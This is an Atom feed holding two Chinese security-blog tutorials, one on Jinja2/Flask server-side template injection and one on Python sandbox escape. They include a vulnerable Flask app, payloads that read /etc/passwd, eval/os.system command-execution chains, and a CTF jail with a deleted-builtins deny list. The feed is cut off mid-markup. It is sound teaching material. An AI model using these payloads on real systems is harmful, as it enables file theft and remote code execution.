<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2019-02-08T10:11:56.488Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSTI-injection</title>
    <link href="0verwatch.top/SSTI-injection.html"/>
    <id>0verwatch.top/SSTI-injection.html</id>
    <published>2019-02-04T08:30:46.000Z</published>
    <updated>2019-02-08T10:11:56.488Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先入个门"><a href="#先入个门" class="headerlink" title="先入个门"></a>先入个门</h3><h4 id="Jimja2"><a href="#Jimja2" class="headerlink" title="Jimja2"></a>Jimja2</h4><p><code>Jinja2</code>是默认的仿<code>Django</code>模板的一个模板引擎，由<code>Flask</code>的作者开发。网上搜的语法<a id="more"></a>2333，方便自己回顾</p><h5 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ... &#125;&#125;：装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</span><br><span class="line">&#123;% ... %&#125;：装载一个控制语句。</span><br><span class="line">&#123;# ... #&#125;：装载一个注释，模板渲染的时候会忽视这中间的值</span><br></pre></td></tr></table></figure><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>在模板中添加变量，可以使用（set）语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set name=&apos;xx&apos; %&#125;</span><br></pre></td></tr></table></figure><p><code>with</code>语句来创建一个内部的作用域，将<code>set</code>语句放在其中，这样创建的变量只在<code>with</code>代码块中才有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with gg = 42 %&#125;</span><br><span class="line">&#123;&#123; gg &#125;&#125;</span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><h5 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ken.sick %&#125;</span><br><span class="line">Ken is sick.</span><br><span class="line">&#123;% elif ken.dead %&#125;</span><br><span class="line">You killed Ken! You bastard!!!</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">Kenny looks okay --- so far</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h5 id="for语句"><a href="#for语句" class="headerlink" title="for语句"></a>for语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for user in users %&#125;</span><br><span class="line">&#123;&#123; user.username|e &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %&#125;</span><br><span class="line">&amp;lt;dt&amp;gt;&#123;&#123; key|e &#125;&#125;&amp;lt;/dt&amp;gt;</span><br><span class="line">&amp;lt;dd&amp;gt;&#123;&#123; value|e &#125;&#125;&amp;lt;/dd&amp;gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h5 id="Jinja2中for循环内置常量"><a href="#Jinja2中for循环内置常量" class="headerlink" title="Jinja2中for循环内置常量"></a>Jinja2中for循环内置常量</h5><p>loop.index    当前迭代的索引（从1开始）<br>loop.index0    当前迭代的索引（从0开始）<br>loop.first    是否是第一次迭代，返回True\/False<br>loop.last    是否是最后一次迭代，返回True\/False<br>loop.length    序列的长度<br> 注意：不可以使用continue和break表达式来控制循环的执行。</p><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>过滤器是通过<code>（|）</code>符号进行使用的，例如：<code>0</code>：将返回name的长度</p><p>类似于我们平常的的函数，他他这种应该就是内置函数，因为它本身就含有很多过滤器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">abs(value)：返回一个数值的绝对值。示例：-1|abs</span><br><span class="line">last(value)：返回一个序列的最后一个元素。示例：names|last。</span><br><span class="line">length(value)：返回一个序列或者字典的长度。示例：names|length。</span><br><span class="line">join(value,d=u&apos;&apos;)：将一个序列用d这个参数的值拼接成字符串。</span><br><span class="line">int(value)：将值转换为int类型。</span><br><span class="line">float(value)：将值转换为float类型。</span><br><span class="line">lower(value)：将字符串转换为小写。</span><br><span class="line">upper(value)：将字符串转换为小写</span><br></pre></td></tr></table></figure><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>简单地说跟这种类型的注入跟一般的注入成因其实一样，都是过分相信用户的输入导致的漏洞，这样一来通过模板注入可以导致敏感信息泄露、代码执行等诸多漏洞，这里有一篇关于PHP的模板注入，写的挺好，可以参考一下：<code>https://www.freebuf.com/vuls/83999.html</code>,但这篇文章PHP 模版引擎 Twig 作为例子，只是简单介绍了一下XSS的相关漏洞，并没有触发更大的危害，但是常规的测试方法已经写了出来，跟测试注入其实差不多，就是换了内容而已。</p><p><img src="https://s2.ax1x.com/2019/02/07/ktayNt.png" alt="ktayNt.png"></p><p>所以下面就自己搭个python的web环境，以危害更大的<code>SSTI模板</code>注入作为例子说明，这是app.py里面的代码内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>, <span class="string">'guest'</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">"Hello "</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br></pre></td></tr></table></figure><p>可以看得出来name参数直接以get方式获取，直接拼接在Hello后面作为模板，直接render，这很明显name参数是可控的。问题也恰好是出在这。</p><p>当然这里也是有XSS的</p><p><img src="https://s2.ax1x.com/2019/02/07/ktJXGD.png" alt="ktJXGD.png"></p><p>但是重点还是放在读文件这一功能上，这也相当于直接RCE了，先要学习一下下面这几个类，<code>__mro__</code>以及<code>__subclasses__</code>属性，其实这里有点像python沙盒绕过的构造方法23333.</p><p><code>__mro__</code>中的MRO(Method Resolution Order)代表着解析方法调用的顺序，可以看看<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__" target="_blank" rel="noopener">Python文档</a>中的介绍。</p><p><code>__subclasses__</code>属性在这里作为一种方法被<a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__" target="_blank" rel="noopener">定义</a>为，对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表”。</p><p>上面的这两个属性引用自这篇文章：<code>https://www.freebuf.com/articles/web/98928.html</code></p><p>个人直接理解就是<code>__mro__</code>会输出当前对象所调用的全部类包括其父类，而<code>__subclasses__</code>会输出该类下所有的子类。OK，这样就可以愉快的开始了</p><p>先来测试一下是否存在这个漏洞，输入参数<code>25hello</code>，明显存在漏洞</p><p><img src="https://s2.ax1x.com/2019/02/07/ktfbPU.png" alt="ktfbPU.png"></p><p>首先我们要做的第一件事便是选择一个new-style object用于访问<code>object</code>基类。可以简单的使用<code>&#39;&#39;</code>，一个空字符串，<code>str</code>对象类型。之后可以使用<code>__mro__</code>属性访问对象的继承类。将<code></code>作为payload注入到存在SSTI漏洞的页面中</p><p><img src="https://s2.ax1x.com/2019/02/07/ktYYQJ.png" alt="ktYYQJ.png"></p><p>出现两个类，选择第二个object基类，并显示该类下方的所有子类，注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/07/ktYReI.png" alt="ktYReI.png"></p><p>上面链接的文章里面使用file类去进行对文件的读写操作，payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>但是file方法在py3中已经不支持，只要找到可以执行代码的函数或者其他读文件的函数都可以，在vulhub上找到的另外一个适合py3的，利用了eval函数去实现RCE的功能，因为执行语句去实现的，所以得用%括住。方法不止一种，找到对的继承链就可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/07/ktNZbn.png" alt="ktNZbn.png"></p><p>成功读取根目录下的文件</p><p><img src="https://s2.ax1x.com/2019/02/07/ktNMCT.png" alt="ktNMCT.png"></p><p>另外再拿</p><p>这东西只要找对继承关系，而且继承关系里面的方法清楚的话就很快获得效果，当然防范的话得从代码层下手，永远不要相信用户的输入就对了，对可控变量做好防御XD</p><p>参考文章:</p><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p><p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p><p><a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;先入个门&quot;&gt;&lt;a href=&quot;#先入个门&quot; class=&quot;headerlink&quot; title=&quot;先入个门&quot;&gt;&lt;/a&gt;先入个门&lt;/h3&gt;&lt;h4 id=&quot;Jimja2&quot;&gt;&lt;a href=&quot;#Jimja2&quot; class=&quot;headerlink&quot; title=&quot;Jimja2&quot;&gt;&lt;/a&gt;Jimja2&lt;/h4&gt;&lt;p&gt;&lt;code&gt;Jinja2&lt;/code&gt;是默认的仿&lt;code&gt;Django&lt;/code&gt;模板的一个模板引擎，由&lt;code&gt;Flask&lt;/code&gt;的作者开发。网上搜的语法
    
    </summary>
    
      <category term="SSTI注入" scheme="0verwatch.top/categories/SSTI%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SSTI注入" scheme="0verwatch.top/tags/SSTI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python沙盒绕过</title>
    <link href="0verwatch.top/python-sandbox-bypass.html"/>
    <id>0verwatch.top/python-sandbox-bypass.html</id>
    <published>2019-02-04T08:28:00.000Z</published>
    <updated>2019-02-08T10:20:31.385Z</updated>
    
    <content type="html"><![CDATA[<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>一些函数需要了解一下，这篇文章讲的已经很详细<a id="more"></a>了:<a href="https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12，概括一下分别是下面的函数</a></p><ul><li><code>__class__</code> :返回一个实例所属的类</li><li><code>__bases__</code> :返回一个类<code>直接</code>所继承的类（元组形式）</li><li><code>__mro__</code> :列出解析方法的调用顺序，类似于bases</li><li><code>__subclasses__()</code>：返回子类列表</li><li><code>__dict__</code> ： 列出当前属性/函数的字典</li><li><code>func_globals</code>：返回一个包含函数全局变量的字典引用</li><li><code>__globals__</code>:返回一个当前空间下能使用的模块，方法和变量的字典</li></ul><p>上面的模块中可以尝试理解mro和bases之间的区别，两个的东西还是有点区别的，只是作用在绕过上功能类似。个人感觉mro的发展过程有点像从dfs编程bfs。。。</p><h3 id="dir方法"><a href="#dir方法" class="headerlink" title="dir方法"></a>dir方法</h3><ul><li>dir()在没有参数的时候返回本地作用域中的名称列表</li><li>dir()在有参数的时候返回该对象的有效属性列表</li></ul><p>对比一下下面的例子就知道了，以py2为例：</p><p><img src="https://s2.ax1x.com/2019/02/07/ktIJLd.png" alt="ktIJLd.png"></p><h3 id="内联模块"><a href="#内联模块" class="headerlink" title="内联模块"></a>内联模块</h3><p>python中可以直接运行一些函数，例如<code>int(),list()</code>等等。这些函数可以在内联模块中可以查到。</p><p>常用的有下面两个：<code>__import__</code>以及<code>__builtins__</code>，但是在py2里面内置模块名字叫<code>__builtin__</code>，py3改名叫<code>__builtins__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 2.7</span></span><br><span class="line">In [<span class="number">4</span>]: __builtin__</span><br><span class="line">Out[<span class="number">4</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: __builtins__</span><br><span class="line">Out[<span class="number">5</span>]: &lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="comment">#python 3.6</span></span><br><span class="line">In [<span class="number">2</span>]: __builtin__                                                                                             </span><br><span class="line">Out[<span class="number">2</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: __builtins__                                                                                    </span><br><span class="line">Out[<span class="number">3</span>]: &lt;module <span class="string">'builtins'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>在py2中，在主模块<code>main</code>中，<code>__builtins__</code>是对内建模块<code>__builtin__</code>本身的引用，即<code>__builtins__</code>完全等价于<code>__builtin__</code>，二者完全是一个东西，不分彼此。</p><p>非主模块<code>main</code>中，<code>__builtins__</code>仅是对<code>__builtin__.__dict__</code>的引用，而非<code>__builtin__</code>本身</p><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><p>如果导入的模块a中有着另一个模块b，那么，我们可以用<code>a.b</code>的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b。</p><h3 id="弄一个沙盒环境"><a href="#弄一个沙盒环境" class="headerlink" title="弄一个沙盒环境"></a>弄一个沙盒环境</h3><p>一般读取目录的时候需要使用到<code>os.system</code>函数，这样的一句话这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">'os'</span>).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure><p>然后我们可以把一些关键模块给删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'eval'</span>]</span><br><span class="line"><span class="comment"># 管理员删了很多的危险函数</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'...'</span>]</span><br></pre></td></tr></table></figure><p>这时候import已经失效了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: __import__ <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><p>但是可以用 reload来重新导入模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br></pre></td></tr></table></figure><p>但是请注意，在<strong>Python 3.0把reload内置函数移到了import库模块中。</strong>所以python3中，这个方法已经失效了</p><p>所以在制作py2.7沙箱的时候，还需要删除<code>reload</code>的方法。</p><h3 id="一道题目"><a href="#一道题目" class="headerlink" title="一道题目"></a>一道题目</h3><p>这个题目很常见了，py2的环境，自己拿来练下手,最后是读取当前文件夹下的key文件，删除了很多关键函数，也包括了<code>reload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [<span class="string">'open'</span>,</span><br><span class="line">              <span class="string">'file'</span>,</span><br><span class="line">              <span class="string">'execfile'</span>,</span><br><span class="line">              <span class="string">'compile'</span>,</span><br><span class="line">              <span class="string">'reload'</span>,</span><br><span class="line">              <span class="string">'__import__'</span>,</span><br><span class="line">              <span class="string">'eval'</span>,</span><br><span class="line">              <span class="string">'input'</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">'S+'</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="keyword">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure><h4 id="用file类去读取文件"><a href="#用file类去读取文件" class="headerlink" title="用file类去读取文件"></a>用file类去读取文件</h4><p>面对这个时候我们已经不能使用<code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code>去读取文件但我们可以利用object类去寻找file类去读取文件内容</p><p>思路是这样的：</p><ol><li>随便找一个内置类对象用<code>__class__</code>拿到他所对应的类</li><li>用<code>__bases__</code>拿到基类（<code>&lt;class &#39;object&#39;&gt;</code>）</li><li>用<code>__subclasses__()</code>拿到子类列表</li><li>在子类列表中直接寻找可以利用的类</li></ol><p>也就是</p><p><code>().__class__.__bases__[0].__subclasses__()[40]</code></p><p>但是面对<code>__subclasses__</code>的子类太多找不到对应的file类怎么办？可以这样去寻找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span>   <span class="comment">#这里填写你要寻找的类即可</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后可以用dir函数查看里面的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure><p>所以最后的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br><span class="line"><span class="comment">#同样的效果</span></span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>等价于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">'./key'</span>).read()</span><br></pre></td></tr></table></figure><p>注意py3已经移除了file了这种方法也只能在py3里面使用</p><h4 id="利用内置函数执行命令"><a href="#利用内置函数执行命令" class="headerlink" title="利用内置函数执行命令"></a>利用内置函数执行命令</h4><p>可以根据第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用<code>__globals__</code>更深入的去看每个类可以调用的东西（包括模块，类，变量等等），查找<code>os</code>模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 71)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 76)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>然后构造继承链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure><p>但是这个方法也只能在py2里面实现，同样在前面的SSTI注入中vulhub给的测试payload用的是<code>class &#39;warnings.catch_warnings&#39;</code>这一个类，同样这个类里面也有os模块，可以像下面这个样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]</span><br><span class="line">print(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ls'</span>))</span><br><span class="line"><span class="comment"># func_globals:返回一个包含函数全局变量的字典引用；</span></span><br></pre></td></tr></table></figure><p>上面的方法大都有限制，py2跟py3可以使用<code>__builtins__</code>通吃</p><p>py3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>py2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami')"</span>)</span><br></pre></td></tr></table></figure><p>因为<code>__builtins__</code>返回的是一个字典。通过has_key的方法，可以发现我们想要的是否存在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 